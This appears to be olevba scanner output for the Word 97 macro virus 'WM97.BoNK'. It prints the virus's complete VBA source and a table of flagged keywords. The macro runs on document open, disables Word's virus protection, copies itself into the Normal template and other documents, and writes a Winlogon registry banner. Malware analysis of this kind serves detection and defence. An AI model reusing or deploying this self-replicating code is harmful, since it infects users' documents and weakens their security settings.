olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bonk
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bonk - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BoNK.bas 
in file: Virus.MSWord.Bonk - OLE stream: 'Macros/VBA/BoNK'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auTOOPen()
On Error Resume Next
z$ = "c:\win32bonk.sys"
bo = "BoNK"
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False: Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents(bo).Export z$
Set ad = ActiveDocument.VBProject.VBComponents
Set nt = NormalTemplate.VBProject.VBComponents
ai = 0
ni = 0
For x = 1 To ad.Count
    If ad(x).Name = bo Then ai = -1
Next x
For y = 1 To nt.Count
    If nt(y).Name = bo Then ni = -1
Next y
If ni = 0 And ai = -1 Then nt.import z$: NormalTemplate.Save
If ni = -1 And ai = 0 Then ad.import z$: ActiveDocument.Save
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "-=[WM97.BoNK]=-"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "| This is WM97.BoNK of the .BoNK-family by Jack Twoflower -=[LzØ]=- |"
End Sub
Sub ExtrasMakro()
End Sub
Sub AnsichtVBCode()
End Sub
Sub AnsichtCode()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auTOOPen            |Runs when the Word document is opened        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

